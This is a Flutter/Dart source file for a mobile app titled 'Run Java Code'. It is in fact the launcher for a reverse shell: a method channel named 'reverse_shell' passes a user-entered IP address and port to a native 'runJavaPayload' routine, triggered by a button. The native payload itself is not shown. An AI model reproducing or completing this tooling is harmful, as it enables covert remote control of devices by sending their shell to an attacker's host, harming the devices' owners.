import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Run Java Code',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: MyHomePage(),
    );
  }
}

class MyHomePage extends StatefulWidget {
  @override
  _MyHomePageState createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  static const platform = MethodChannel('com.example.java_in_flutter/reverse_shell');

  TextEditingController ipController = TextEditingController();
  TextEditingController portController = TextEditingController();
  String result = '';

  Future<void> runJavaPayload(String ip, int port) async {
    try {
      final String res = await platform.invokeMethod('runJavaPayload', {'ip': ip, 'port': port});
      setState(() {
        result = res;
      });
    } on PlatformException catch (e) {
      setState(() {
        result = "Failed to run Java Payload: '${e.message}'.";
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text("Run Java Code in Flutter"),
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            TextField(
              controller: ipController,
              decoration: InputDecoration(hintText: 'Enter IP Address'),
            ),
            TextField(
              controller: portController,
              decoration: InputDecoration(hintText: 'Enter Port'),
              keyboardType: TextInputType.number,
            ),
            SizedBox(height: 20),
            ElevatedButton(
              onPressed: () {
                String ip = ipController.text;
                int port = int.parse(portController.text);
                runJavaPayload(ip, port);
              },
              child: Text('Run Java Payload'),
            ),
            SizedBox(height: 20),
            Text(result),
          ],
        ),
      ),
    );
  }
}
